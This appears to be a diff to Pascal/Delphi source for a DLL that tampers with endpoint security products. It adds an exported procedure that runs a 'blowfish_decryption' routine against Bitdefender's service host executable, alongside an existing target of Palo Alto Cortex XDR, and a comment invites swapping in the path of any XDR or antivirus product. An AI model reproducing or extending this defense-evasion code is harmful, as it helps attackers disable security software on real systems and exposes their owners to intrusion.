@@ -176,8 +176,14 @@ begin
  blowfish_decryption('C:\Program Files\Palo Alto Networks\Traps\CyveraConsole.exe');
 end;
 
+procedure bit; stdcall; 
+begin
+blowfish_decryption('C:\Program Files\Bitdefender\Bitdefender Security\bdservicehost.exe');
+end; 
+
 
 exports dec,
+        bit,
         stealth;
 begin
  // here replace the path to any XDR solution or AV,below is default path of Cortex
